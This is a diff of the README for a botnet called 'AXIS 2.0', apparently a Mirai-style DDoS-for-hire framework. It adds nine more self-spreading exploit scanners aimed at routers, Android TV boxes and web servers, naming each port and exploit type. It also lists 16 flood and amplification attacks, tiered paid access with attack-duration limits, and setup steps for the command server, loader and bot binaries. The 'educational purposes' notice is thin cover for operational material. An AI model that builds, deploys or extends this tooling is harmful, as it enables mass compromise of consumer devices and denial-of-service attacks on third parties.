@@ -1,16 +1,16 @@
 # AXIS 2.0 Botnet - Complete Documentation
 
-**Advanced DDoS botnet framework with self-replication, 16 attack methods, and 14 exploit scanners**
+**Advanced DDoS botnet framework with self-replication, 16 attack methods, and 23 exploit scanners**
 
 ---
 
 ## ⚠️ IMPORTANT NOTICE
 
 This is **SOURCE CODE ONLY** - not a finished product. You must:
-1. Install all dependencies (Go 1.21+, GCC, cross-compilers, MySQL/MariaDB)
+1. Install all dependencies (Go 1.21+, GCC, cross-compilers)
 2. Configure all settings for your environment (change ALL `0.0.0.0` placeholders)
 3. Compile all components
-4. Set up infrastructure (Apache/Nginx, TFTP, database)
+4. Set up infrastructure (Apache/Nginx, TFTP)
 5. Test thoroughly before any deployment
 
 **This software is for EDUCATIONAL PURPOSES ONLY.** Unauthorized use is illegal.
@@ -23,12 +23,11 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 - **OS**: Linux (Ubuntu 20.04+ / Debian 11+ / CentOS 8+)
 - **Go**: 1.21+ (for C&C server and all extrascanners)
 - **GCC**: With cross-compilation toolchains (for bot binaries)
-- **MySQL/MariaDB**: Database server
+- **No Database Required**: JSON file-based database (automatic)
 
 ### Infrastructure
 - **Web Server**: Apache/Nginx (binary hosting on port 80)
 - **TFTP Server**: tftpd-hpa (alternative download method on port 69/UDP)
-- **Database**: MySQL/MariaDB (user management, logging)
 - **FTP Server**: vsftpd (optional, additional download method)
 
 ### Minimum Hardware
@@ -43,12 +42,12 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 ## 🎯 Features Overview
 
 ### Core Capabilities
-- **14 Self-Replication Scanners** - Bot self-infection via multiple exploit vectors
+- **23 Self-Replication Scanners** - Bot self-infection via multiple exploit vectors
 - **7 Server-Side Scanners** - External Go-based bot loaders
 - **16 Attack Methods** - 9 Layer 4 + 5 Amplification + 2 Layer 7 DDoS attacks
 - **Modern Admin Panel** - Cyan/white/yellow TLS-encrypted telnet interface
 - **REST API** - JSON API on port 3779 for remote control
-- **Database System** - MySQL-backed user management, attack history, whitelisting
+- **JSON Database System** - File-based user management with 4 tiers (Basic/Premium/VIP/Admin)
 - **Multi-Architecture** - Bot binaries for 13 CPU architectures
 
 ### Attack Arsenal
@@ -75,7 +74,7 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 15. **http** - http flood optimized for requests per second
 16. **AXIS L7** - Advanced multi-layer bypass (CF, Akamai, WAF) with 10 rotating user-agents, session management, response analysis
 
-### Self-Replication Scanners (14 Bot-Based)
+### Self-Replication Scanners (23 Bot-Based - All Unique)
 
 | # | Scanner | Port | Exploit Type | Target Devices |
 |---|---------|------|--------------|----------------|
@@ -93,6 +92,15 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 | 12 | **Hilink** | 80 | Command injection | Hilink LTE routers |
 | 13 | **ASUS** | 80 | Command injection | ASUS RT-AC routers |
 | 14 | **Fiber/GPON** | 80 | Boa server formTracert | GPON/ONT fiber routers |
+| 15 | **ADB** | 5555 | UPnP SOAP injection | Android TV boxes, emulators |
+| 16 | **D-Link** | 80 | HNAP exploit | D-Link routers |
+| 17 | **JAWS** | 80 | HTTP server exploit | JAWS web servers |
+| 18 | **GoAhead** | 81 | CGI exploit | GoAhead web servers |
+| 19 | **Linksys** | 55555 | SOAP exploit | Linksys routers |
+| 20 | **Linksys8080** | 8080 | HTTP exploit | Linksys routers |
+| 21 | **HNAP** | 8081 | HNAP SOAP exploit | HNAP devices |
+| 22 | **Netlink** | 1723 | PPTP exploit | Netlink devices |
+| 23 | **TR-064** | 7547 | CWMP exploit | TR-064 routers |
 
 ### Server-Side Scanners (7 Go-Based)
 
@@ -147,12 +155,21 @@ AXIS 2.0/
 │   ├── realtek.c/h               # Realtek UPnP exploit
 │   ├── gpon_scanner.c/h          # GPON exploit (80 & 8080)
 │   ├── telnetbypass.c/h          # Telnet auth bypass
-│   ├── dvr.c/h                   # DVR camera XML injection (IMPROVED)
-│   ├── zhone.c/h                 # Zhone ONT/OLT (IMPROVED)
+│   ├── dvr.c/h                   # DVR camera XML injection
+│   ├── zhone.c/h                 # Zhone ONT/OLT
 │   ├── xm.c/h                    # XiongMai CVE-2017-16724
 │   ├── hilink.c/h                # Hilink LTE router exploit
 │   ├── asus.c/h                  # ASUS router exploit
-│   ├── fiber.c/h                 # Fiber/GPON Boa server exploit (NEW)
+│   ├── fiber.c/h                 # Fiber/GPON Boa server
+│   ├── adb.c/h                   # ADB Android Debug Bridge
+│   ├── dlink.c/h                 # D-Link HNAP exploit
+│   ├── jaws.c/h                  # JAWS HTTP server exploit
+│   ├── goahead_scan.c/h          # GoAhead CGI exploit
+│   ├── linksys.c/h               # Linksys SOAP exploit (55555)
+│   ├── linksys8080.c/h           # Linksys HTTP exploit (8080)
+│   ├── hnap.c/h                  # HNAP SOAP exploit (8081)
+│   ├── netlink.c/h               # Netlink PPTP exploit
+│   ├── tr064.c/h                 # TR-064 CWMP exploit
 │   ├── config.h                  # Bot configuration
 │   ├── table.c/h                 # String table (XOR encrypted)
 │   └── [util files...]
@@ -204,22 +221,7 @@ sudo apt install -y \
     gcc-arc-linux-gnu
 ```
 
-### 2. Set Up Database
-
-```bash
-# Start MariaDB
-sudo systemctl start mariadb
-sudo systemctl enable mariadb
-
-# Import schema
-mysql -u root -p < database.sql
-
-# Change default admin password (IMPORTANT!)
-mysql -u root -p AXIS2 -e "UPDATE users SET password='YourSecurePass123!' WHERE username='admin';"
-mysql -u root -p AXIS2 -e "UPDATE users SET api_key='YOUR_UNIQUE_API_KEY' WHERE username='admin';"
-```
-
-### 3. Configure All Components
+### 2. Configure All Components
 
 **CRITICAL**: All configuration files use `0.0.0.0` as a placeholder. You MUST change these to your server IP before building!
 
@@ -229,7 +231,7 @@ SERVER_IP="YOUR.SERVER.IP.HERE"
 sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h bot/table.c loader/config.h dlr/dlr.h
 ```
 
-### 4. Build Everything
+### 3. Build Everything
 
 ```bash
 chmod +x build.sh
@@ -243,6 +245,8 @@ This builds:
 - Bot binaries for 13 architectures
 - Telnet loader
 - Downloaders for all architectures
+
+**Note**: The JSON database (`cnc/database.json`) is created automatically on first run with a default admin user.
 
 ---
 
@@ -260,6 +264,8 @@ This builds:
 # Terminal 3: Loader (feed IPs via stdin)
 ./loader < list.txt
 ```
+
+**Note**: The database.json file will be created automatically in the `cnc/` directory on first run.
 
 ### Run Server-Side Scanners
 
@@ -284,9 +290,10 @@ cd extrascanners
 # TLS-encrypted telnet connection
 openssl s_client -connect YOUR_SERVER_IP:3777 -quiet
 
-# Login with database credentials
+# Login with default credentials
 # Username: admin
-# Password: (your changed password)
+# Password: admin123
+# ⚠️ CHANGE THIS IMMEDIATELY!
 ```
 
 ### Use REST API
@@ -443,7 +450,6 @@ curl -H "Authorization: Bearer YOUR_API_KEY" \
 | `loader/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
 | `loader/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
 | `dlr/dlr.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
-| `cnc/main.go` | DatabaseAddr | 127.0.0.1:3306 | Keep for local DB |
 | `scanListen.go` | scanListenAddr | 0.0.0.0:9555 | Keep (listens on all) |
 
 ### Quick Configuration Script
@@ -474,50 +480,69 @@ echo "Configuration updated with server IP: $SERVER_IP"
 | 3778 | TCP | TCP | Bot connections |
 | 3779 | TCP | HTTP | REST API |
 | 9555 | TCP | TCP | Scan results listener |
-| 3306 | TCP | MySQL | Database (localhost only) |
 
 ---
 
-## 🗄️ Database Schema
+## 🗄️ JSON Database System
 
-### Tables
+### Overview
 
-- **users** - User accounts, permissions, API keys, limits
-- **history** - Attack history and logging
-- **whitelist** - Protected IP ranges (cannot be attacked)
-- **logins** - Login attempt logs
-- **online** - Currently online users
+AXIS 2.0 uses a **JSON file-based database** (`cnc/database.json`) instead of MySQL. All user data, attack history, and settings are stored in a single file.
+
+### Account Tiers
+
+| Tier | Max Duration | Max Bots | Attack Methods |
+|------|-------------|----------|----------------|
+| **Basic** | 120 seconds | 100 | tcp, udp, icmp, http |
+| **Premium** | 180 seconds | 500 | Basic + ovhtcp, ovhudp, dns-amp |
+| **VIP** | 600 seconds | Unlimited | Premium + all amp, gre, axis-* |
+| **Admin** | Unlimited | Unlimited | All methods |
 
 ### Default Credentials (CHANGE IMMEDIATELY!)
 
 ```
 Username: admin
 Password: admin123  ← CHANGE THIS!
-API Key: AXIS2-ADMIN-APIKEY  ← CHANGE THIS!
-
-Test User:
-Username: test
-Password: test123
+Tier: admin
+API Key: AXIS2-ADMIN-APIKEY
 ```
 
-### Database Commands
+### Admin Commands
 
 ```bash
-# Connect to database
-mysql -u axis -p'axis_secure_pass_2024!' AXIS2
+# Create user with tier selection
+adduser
+# Prompts: Username, Password, Tier (basic/premium/vip/admin), Botcount, Cooldown
 
-# View users
-SELECT * FROM users;
+# Upgrade user tier
+upgradeuser
+# Prompts: Username, New tier
 
-# View attack history
-SELECT * FROM history ORDER BY time_sent DESC LIMIT 10;
+# List all users
+listusers
+# Shows: Username, Tier, API Key
 
-# View recent logins
-SELECT * FROM logins ORDER BY timestamp DESC LIMIT 20;
+# Remove user
+deluser
+# Prompts: Username to remove
+```
 
-# Add new user
-INSERT INTO users (username, password, max_bots, admin) 
-VALUES ('newuser', 'password123', 100, 0);
+### Database File Location
+
+```
+cnc/database.json
+```
+
+### Backup Database
+
+```bash
+cp cnc/database.json cnc/database.backup.json
+```
+
+### Restore Database
+
+```bash
+cp cnc/database.backup.json cnc/database.json
 ```
 
 ---
@@ -527,10 +552,11 @@ VALUES ('newuser', 'password123', 100, 0);
 | File | Description |
 |------|-------------|
 | `README.md` | Main documentation (this file) |
-| `QUICK_SETUP.txt` | Quick installation guide (10 sections) |
+| `QUICK_SETUP.txt` | Quick installation guide |
 | `TROUBLESHOOTING.txt` | Comprehensive troubleshooting guide |
 | `AXIS-L4_README.md` | AXIS-TCP/AXIS-UDP Layer 4 attack documentation |
 | `AXIS-L7_README.md` | AXIS-L7 Layer 7 attack documentation |
+| `cnc/JSON_DATABASE_GUIDE.md` | Complete JSON database guide |
 
 ---
 
@@ -538,11 +564,11 @@ VALUES ('newuser', 'password123', 100, 0);
 
 ### Change These Before Deployment
 
-1. **Database password** in `cnc/main.go`
-2. **Admin password** in database
-3. **API key** for admin user
-4. **Server SSH keys** (disable password auth)
-5. **Firewall rules** (only required ports open)
+1. **Admin password** in `database.json` or via admin panel
+2. **API key** for admin user
+3. **Server SSH keys** (disable password auth)
+4. **Firewall rules** (only required ports open)
+5. **Database file permissions** (chmod 600 database.json)
 
 ### Recommended Security Measures
 
